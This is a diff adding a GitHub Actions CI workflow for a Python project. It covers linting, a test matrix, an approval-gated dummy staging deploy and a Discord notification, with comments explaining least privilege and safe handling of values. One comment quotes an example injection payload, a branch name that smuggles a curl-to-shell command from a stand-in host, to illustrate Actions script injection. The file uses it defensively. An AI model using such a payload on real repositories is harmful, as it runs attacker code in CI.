@@ -1,0 +1,198 @@
+# ABOUTME: Continuous Integration pipeline: quality gates that block the merge on a pull request.
+# ABOUTME: Runs on every pull request targeting main and on every push that lands on main.
+#
+# Reference: docs/ci-pipeline.md
+
+name: CI
+
+# Three triggers, with different jobs to do:
+#   - pull_request: this is what makes the CI an actual merge GATE.
+#   - push on main: keeps the README badge honest about the health of main.
+#   - push of any tag: a tag is a release candidate, so it goes through the same
+#     gates. Activity 2 hangs the versioned image publication off this trigger.
+on:
+  pull_request:
+    branches: [main]
+  push:
+    branches: [main]
+    tags: ['*']
+
+# Least privilege: the GITHUB_TOKEN of this workflow can only READ the repo.
+# Without this block the token defaults to contents: write. Jobs that need more
+# ask for it explicitly, one job at a time.
+permissions:
+  contents: read
+
+# Only the latest run per branch matters. A new push cancels the previous run
+# instead of queueing behind it, which keeps the feedback on the PR fast.
+concurrency:
+  group: ci-${{ github.ref }}
+  cancel-in-progress: true
+
+env:
+  # Version used by the jobs that do not need the full matrix.
+  DEFAULT_PYTHON_VERSION: '3.12'
+
+jobs:
+  lint:
+    name: Lint (ruff)
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+
+      - name: Set up Python
+        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065  # v5.6.0
+        with:
+          python-version: ${{ env.DEFAULT_PYTHON_VERSION }}
+
+      - name: Cache pip downloads
+        uses: actions/cache@0400d5f644dc74513175e3cd8d07132dd4860809  # v4.2.4
+        with:
+          path: ~/.cache/pip
+          key: ${{ runner.os }}-pip-lint-${{ hashFiles('requirements*.txt') }}
+          restore-keys: |
+            ${{ runner.os }}-pip-lint-
+
+      - name: Install dev dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements-dev.txt
+
+      # Configuration lives in pyproject.toml, so this exact command produces
+      # the exact same result on a developer machine and here.
+      - name: Run ruff
+        run: ruff check .
+
+  # The matrix lives here, in the caller. The test steps live in the reusable
+  # workflow. A job that calls a reusable workflow has no runs-on and no steps:
+  # whoever runs steps is the reusable one.
+  #
+  # security-events: write is granted here because the reusable workflow uploads
+  # the Trivy SARIF report to the Security tab.
+  # The tested versions come from the repository variable PYTHON_VERSIONS
+  # (Settings > Secrets and variables > Actions > Variables), so widening or
+  # narrowing the coverage does not require a commit. The literal after || is a
+  # fallback: without it, a clone of this repository with no variable set would
+  # break on fromJSON of an empty string.
+  test:
+    permissions:
+      contents: read
+      security-events: write
+    strategy:
+      fail-fast: false
+      matrix:
+        python-version: ${{ fromJSON(vars.PYTHON_VERSIONS || '["3.10", "3.11", "3.12"]') }}
+    uses: ./.github/workflows/_reusable-test.yml
+    with:
+      python-version: ${{ matrix.python-version }}
+
+  # Placeholder deployment whose real purpose is the human approval gate. The
+  # staging environment is configured with required reviewers, so this job shows
+  # up as "Waiting" and pauses until someone approves it under Review
+  # deployments. The approval is recorded in the repository deployment history,
+  # which is auditing for free.
+  #
+  # The if: restricts it to a push on main: deploying on every pull request
+  # would make no sense, and reviewers would be asked to approve constantly.
+  #
+  # Do NOT mark this job as a required status check: it never runs on a pull
+  # request, so a required check that never reports would block every merge.
+  deploy-staging:
+    name: Deploy to staging (dummy)
+    needs: [lint, test]
+    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    environment:
+      name: staging
+    steps:
+      - name: Simulate deployment
+        run: |
+          echo "Deploying commit ${{ github.sha }} to staging"
+          echo "Target: ${{ secrets.STAGING_URL }}"
+
+  # Notification job. if: always() is mandatory here: a job that depends on the
+  # success of the previous ones would never fire on failure, which is exactly
+  # when the team needs to hear about it.
+  notify:
+    name: Notify pipeline result
+    needs: [lint, test, deploy-staging]
+    if: always()
+    runs-on: ubuntu-latest
+    steps:
+      # How a step hands a value to a later step: it appends `name=value` lines
+      # to the file whose path the runner exposes as $GITHUB_OUTPUT. The `id:`
+      # below is what makes those values addressable as steps.msg.outputs.<name>
+      # from the next step on.
+      #
+      # deploy-staging is skipped on pull requests, so "skipped" counts as
+      # neutral. Treating it as a failure would make every pull request report
+      # a red pipeline.
+      - name: Compose message
+        id: msg
+        env:
+          LINT_RESULT: ${{ needs.lint.result }}
+          TEST_RESULT: ${{ needs.test.result }}
+          DEPLOY_RESULT: ${{ needs.deploy-staging.result }}
+        run: |
+          if [ "$LINT_RESULT" = "success" ] \
+             && [ "$TEST_RESULT" = "success" ] \
+             && { [ "$DEPLOY_RESULT" = "success" ] || [ "$DEPLOY_RESULT" = "skipped" ]; }; then
+            # Discord wants the embed colour as a decimal integer:
+            # 3066993 is #2ECC71 (green), 15158332 is #E74C3C (red).
+            echo "status=SUCCESS" >> "$GITHUB_OUTPUT"
+            echo "color=3066993"  >> "$GITHUB_OUTPUT"
+          else
+            echo "status=FAILURE" >> "$GITHUB_OUTPUT"
+            echo "color=15158332" >> "$GITHUB_OUTPUT"
+          fi
+
+      # Every value the payload needs arrives through env:, and the shell reads
+      # it as $VAR. Writing ${{ ... }} straight into a run: block would paste the
+      # value into the script text before the shell ever sees it, so a branch
+      # named `x";curl evil.sh|sh;"` would execute — the classic Actions script
+      # injection. Through env: the value is just data.
+      #
+      # jq builds the JSON instead of string concatenation, so a quote or an
+      # accent in a branch name cannot produce a malformed body. jq comes
+      # preinstalled on the GitHub-hosted Ubuntu runners.
+      #
+      # The guard sits on the step, not on the job, because the secrets context
+      # is not available in a job-level if:. Without it, a clone of this
+      # repository with no webhook configured would fail on an empty curl.
+      - name: Send Discord notification
+        if: env.WEBHOOK_URL != ''
+        env:
+          WEBHOOK_URL: ${{ secrets.NOTIFY_WEBHOOK_URL }}
+          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+          STATUS: ${{ steps.msg.outputs.status }}
+          COLOR: ${{ steps.msg.outputs.color }}
+          REPO: ${{ github.repository }}
+          EVENT: ${{ github.event_name }}
+          BRANCH: ${{ github.ref_name }}
+          ACTOR: ${{ github.actor }}
+          LINT_RESULT: ${{ needs.lint.result }}
+          TEST_RESULT: ${{ needs.test.result }}
+        run: |
+          jq -n \
+            --arg  title  "CI ${STATUS} — ${REPO}" \
+            --argjson color "${COLOR}" \
+            --arg  url    "${RUN_URL}" \
+            --arg  event  "${EVENT}" \
+            --arg  branch "${BRANCH}" \
+            --arg  actor  "${ACTOR}" \
+            --arg  lint   "${LINT_RESULT}" \
+            --arg  tests  "${TEST_RESULT}" \
+            '{embeds: [{
+                title: $title,
+                color: $color,
+                url:   $url,
+                fields: [
+                  {name: "Event",  value: $event,  inline: true},
+                  {name: "Branch", value: $branch, inline: true},
+                  {name: "Author", value: $actor,  inline: true},
+                  {name: "Lint",   value: $lint,   inline: true},
+                  {name: "Tests",  value: $tests,  inline: true}
+                ]
+              }]}' \
+          | curl -sS -X POST -H 'Content-Type: application/json' -d @- "$WEBHOOK_URL"
